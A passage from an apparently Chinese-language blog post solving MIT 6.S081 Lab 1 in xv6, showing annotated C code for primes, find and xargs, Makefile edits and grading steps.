class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prime %d\n&quot;</span>, prime);	<span class="comment">// 打印素数</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pipefd[<span class="number">2</span>], pid, number, status;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;pipe error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((pid = fork()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        close(pipefd[<span class="number">1</span>]);</span><br><span class="line">        close(fd);</span><br><span class="line">        process(pipefd[<span class="number">0</span>]);	<span class="comment">// 当前子进程 process 后就变成另一个进程的父进程了！</span></span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        close(pipefd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((n = read(fd, &amp;number, len)) != <span class="number">0</span>) &#123;	<span class="comment">// 读取父进程传递的数据</span></span><br><span class="line">            <span class="keyword">if</span> (n != len) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (number % prime != <span class="number">0</span>) &#123;	<span class="comment">// 如果不能被 prime 整除就发送给子进程</span></span><br><span class="line">                <span class="keyword">if</span> (write(pipefd[<span class="number">1</span>], &amp;number, len) != len) &#123;</span><br><span class="line">                    <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;write error\n&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(pipefd[<span class="number">1</span>]);</span><br><span class="line">        close(fd);</span><br><span class="line">        wait(&amp;status);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改 Makefile 文件</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">	$U/_pingpong\</span><br><span class="line">	$U/_primes\</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>make qemu &amp;&amp; primes</strong>，在 xv6 shell 中运行一下</li>
</ul>
<img src="/2024/04/26/6-S081-Lab1/image-20240429215132041.png" class="" title="image-20240429215132041">

<blockquote>
<p>符合预期！</p>
</blockquote>
<ul>
<li><strong>.&#x2F;grade-lab-util primes</strong> 进行测试，结果如下</li>
</ul>
<img src="/2024/04/26/6-S081-Lab1/image-20240429215222078.png" class="" title="image-20240429215222078">

<blockquote>
<p>通过！</p>
</blockquote>
<h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><ul>
<li><p>编写 UNIX find 程序的简单版本：查找具有特定名称的目录树中的所有文件。你的解决方案应该在 <code>user/find.c</code> 中</p>
</li>
<li><p>一些提示</p>
<ul>
<li>查看 <code>user/ls.c</code> 了解如何阅读目录</li>
<li>使用递归</li>
<li>不要重复进入 <code>&quot;.&quot;</code> 和 <code>&quot;..&quot;</code></li>
<li><code>make clean</code> 且 <code>make qemu</code> 获得一个干净的文件系统；文件系统的更改在 qemu 的运行中持续存在</li>
<li>&#x3D;&#x3D; 不会按照你期望的方式工作，使用 strcmp</li>
</ul>
</li>
<li><p>关于如何阅读目录，查看 <code>user/ls.c</code>，</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fcntl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>*</span><br><span class="line"><span class="title function_">fmtname</span><span class="params">(<span class="type">char</span> *path)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> buf[DIRSIZ+<span class="number">1</span>];</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find first character after last slash.</span></span><br><span class="line">  <span class="keyword">for</span>(p=path+<span class="built_in">strlen</span>(path); p &gt;= path &amp;&amp; *p != <span class="string">&#x27;/&#x27;</span>; p--)	<span class="comment">// 从后往前找到第一个 /</span></span><br><span class="line">    ;</span><br><span class="line">  p++;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Return blank-padded name.</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strlen</span>(p) &gt;= DIRSIZ)</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  memmove(buf, p, <span class="built_in">strlen</span>(p));	</span><br><span class="line">  <span class="built_in">memset</span>(buf+<span class="built_in">strlen</span>(p), <span class="string">&#x27; &#x27;</span>, DIRSIZ-<span class="built_in">strlen</span>(p));</span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ls</span><span class="params">(<span class="type">char</span> *path)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">512</span>], *p;</span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((fd = open(path, O_RDONLY)) &lt; <span class="number">0</span>)&#123;	<span class="comment">// 以只读的方式打开</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;ls: cannot open %s\n&quot;</span>, path);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="number">0</span>)&#123;	<span class="comment">// 获取文件的状态</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;ls: cannot stat %s\n&quot;</span>, path);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(st.type)&#123;</span><br><span class="line">  <span class="keyword">case</span> T_DEVICE:	</span><br><span class="line">  <span class="keyword">case</span> T_FILE:	<span class="comment">// 文件类型</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %l\n&quot;</span>, fmtname(path), st.type, st.ino, st.size);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> T_DIR:	<span class="comment">// 目录类型</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(path) + <span class="number">1</span> + DIRSIZ + <span class="number">1</span> &gt; <span class="keyword">sizeof</span> buf)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;ls: path too long\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, path);	<span class="comment">// 将 path 复制到 buf 且在追加一个 /</span></span><br><span class="line">    p = buf+<span class="built_in">strlen</span>(buf);</span><br><span class="line">    *p++ = <span class="string">&#x27;/&#x27;</span>;	<span class="comment">// 很实用的技巧，先赋值再移动</span></span><br><span class="line">    <span class="keyword">while</span>(read(fd, &amp;de, <span class="keyword">sizeof</span>(de)) == <span class="keyword">sizeof</span>(de))&#123;	<span class="comment">// 读目录中的每个文件，学到了，还需要一个 dirent 结构体</span></span><br><span class="line">      <span class="keyword">if</span>(de.inum == <span class="number">0</span>)	</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      memmove(p, de.name, DIRSIZ); <span class="comment">// 在 / 后追加读到的文件名</span></span><br><span class="line">      p[DIRSIZ] = <span class="number">0</span>;	<span class="comment">// 在最后追加 /0 显示结尾</span></span><br><span class="line">      <span class="keyword">if</span>(stat(buf, &amp;st) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ls: cannot stat %s\n&quot;</span>, buf);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d\n&quot;</span>, fmtname(buf), st.type, st.ino, st.size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line">    ls(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;argc; i++)</span><br><span class="line">    ls(argv[i]);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>我们的 find 的基本思路就是：是文件就 strcmp 再输出；是目录就读取目录内的所有 “文件”，再递归这些 “文件”</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fcntl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">fmtname</span><span class="params">(<span class="type">char</span> *path)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *p;</span><br><span class="line">    <span class="keyword">for</span>(p = path + <span class="built_in">strlen</span>(path); p &gt;= path &amp;&amp; *p != <span class="string">&#x27;/&#x27;</span>; p--);</span><br><span class="line">    p++;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(p, path)) p = <span class="number">0</span>;	<span class="comment">// 如果读不到 &#x27;/&#x27; 就说明 find path dstfile 中的 path 是一个文件而不是目录</span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">find</span><span class="params">(<span class="type">char</span> *path, <span class="type">char</span> *dstfile)</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">512</span>], *p;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fd = open(path, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;%s: open error\n&quot;</span>, path);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fstat(fd, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;fstat error\n&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (st.type) &#123;</span><br><span class="line">    <span class="comment">// case T_DEVICE:	细节，忽略设备文件</span></span><br><span class="line">    <span class="keyword">case</span> T_FILE:  </span><br><span class="line">        <span class="keyword">if</span> (fmtname(path) != <span class="number">0</span> &amp;&amp; !<span class="built_in">strcmp</span>(fmtname(path), dstfile)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, path);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 逆大天！不要把 break 写到 if 内啊</span></span><br><span class="line">    <span class="keyword">case</span> T_DIR:</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(path) + <span class="number">1</span> + DIRSIZ + <span class="number">1</span> &gt; <span class="keyword">sizeof</span> buf)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ls: path too long\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">strcpy</span>(buf, path);</span><br><span class="line">        p = buf + <span class="built_in">strlen</span>(buf);</span><br><span class="line">        *p++ = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span> (read(fd, &amp;de, <span class="keyword">sizeof</span>(de)) == <span class="keyword">sizeof</span>(de)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (de.inum == <span class="number">0</span> || !<span class="built_in">strcmp</span>(de.name, <span class="string">&quot;.&quot;</span>) || !<span class="built_in">strcmp</span>(de.name, <span class="string">&quot;..&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; </span><br><span class="line">            memmove(p, de.name, DIRSIZ);</span><br><span class="line">            find(buf, dstfile);	<span class="comment">// 使用递归</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">         <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;argc error\n&quot;</span>);</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     find(argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>头文件是从 <code>user/ls.c</code> 中 copy 的</p>
</blockquote>
<ul>
<li>修改 Makefile 文件</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">	$U/_primes\</span><br><span class="line">	$U/_find\</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>make qemu &amp;&amp; echo &gt; b &amp;&amp; mkdir a &amp;&amp; echo &gt; a&#x2F;b &amp;&amp; find . b</strong> 在 xv6 shell 中运行一下</li>
</ul>
<img src="/2024/04/26/6-S081-Lab1/image-20240429222325895.png" class="" title="image-20240429222325895">

<blockquote>
<p>符合预期！</p>
</blockquote>
<ul>
<li><strong>.&#x2F;grade-lab-util find</strong> 进行测试，结果如下</li>
</ul>
<img src="/2024/04/26/6-S081-Lab1/image-20240429222417528.png" class="" title="image-20240429222417528">

<blockquote>
<p>测试通过</p>
</blockquote>
<h1 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h1><ul>
<li><p>编写 UNIX xargs 程序的简单版本：从标准输入中读取行，并为每行运行一个命令，将该行作为命令的参数提供。你的解决方案应该在文件 <code>user./xargs.c</code> 中</p>
</li>
<li><p>一些提示</p>
<ul>
<li>使用 fork 和 exec1 在每行输入上调用命令。父进程中等待子进程终止</li>
<li>要读取单个输入行，请一次读取一个字符，直到读到 <code>&#39;\n&#39;</code></li>
<li><code>kernel/param.h</code> 中声明了 MAXARG，对于声明 argv 数组可能有帮助</li>
<li>在 Makefile 中将程序添加到 UPROGS 中</li>
<li><code>make clean</code> 且 <code>make qemu</code> 获得一个干净的文件系统；文件系统的更改在 qemu 的运行中持续存在</li>
</ul>
</li>
<li><p>关于 <code>echo hello too | xargs echo bye</code> 行为的解释</p>
<ul>
<li>参数是 echo bye，追加参数是 hello too，所以 echo bye hello too 输出 bye hello too</li>
<li>xargs 的参数 echo bye 通过 argv 给出，而追加参数 hello too 则需要通过读取标准输入得到</li>
</ul>
</li>
<li><p>UNIX 上的 xargs 其实还可以有一些可选的标志，比如 <code>echo list.txt | xargs -n 1 echo line</code>，-n 1 表示一次只读取 list.txt 内的一行作为追加参数运行 xargs，直到读完 list.txt</p>
</li>
<li><p>假如 list.txt 中有 <code>1\n2\n</code>，那么</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> list.txt | xargs -n 1 <span class="built_in">echo</span> line</span></span><br><span class="line">line 1</span><br><span class="line">line 2</span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>而我们的 xargs 总是在将 -n 设置为 1 的情况下运行它，即表明我们总是需要每次读取标准输入的一行作为追加参数</p>
</li>
<li><p>一个 exec 的小细节是：对于第二个参数 argv，即使 argv[0] 总是作为 filename，但我们只是需要传递 argv 就可以了，而不需要 argv[1]，这是因为读取参数时它会总是忽略 argv[0]，从 argv[1] 开始，这是一个约定</p>
<blockquote>
<p>嗯，这应该是一个约定吧 ……</p>
</blockquote>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/param.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARGSIZE 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readline</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> buf[], <span class="type">int</span> maxlen)</span> &#123;	<span class="comment">// 经典 readline，参考了 CSAPP</span></span><br><span class="line">    <span class="type">int</span> n, rc;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; maxlen; n++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((rc = read(fd, &amp;c, <span class="number">1</span>) == <span class="number">1</span>)) &#123;</span><br><span class="line">            *buf++ = c;</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">                n++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *buf = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">parse</span><span class="params">(<span class="type">char</span> buf[], <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">char</span> *p = buf;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (*p != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p != buf) p++;	<span class="comment">// 第一次不能 ++</span></span><br><span class="line">        <span class="type">char</span> *arg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>) * ARGSIZE);</span><br><span class="line">        <span class="type">char</span> *t = arg;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*p == <span class="string">&#x27; &#x27;</span> || *p == <span class="string">&#x27;\n&#x27;</span>) &#123;	<span class="comment">// 读完一个参数</span></span><br><span class="line">                *arg = <span class="number">0</span>;	<span class="comment">// 显示结尾，这是必须的！</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            *arg++ = *p++;	<span class="comment">// 使用了那个小技巧，先赋值再移动</span></span><br><span class="line">        &#125;</span><br><span class="line">        *(argv + i++) = t;	<span class="comment">// 添加到 args</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid, status;</span><br><span class="line">    <span class="type">char</span> buf[ARGSIZE], *args[MAXARG];</span><br><span class="line">    <span class="built_in">memset</span>(args, <span class="number">0</span>, MAXARG);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;	<span class="comment">// 添加 argv 中的参数</span></span><br><span class="line">        *(args + i - <span class="number">1</span>) = argv[i]; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (readline(<span class="number">0</span>, buf, <span class="keyword">sizeof</span>(buf)) != <span class="number">0</span>) &#123; <span class="comment">// 从标准输入中读取一行追加参数到 buf</span></span><br><span class="line">        parse(buf, args + argc - <span class="number">1</span>);	<span class="comment">// 解析追加参数到 args</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">            <span 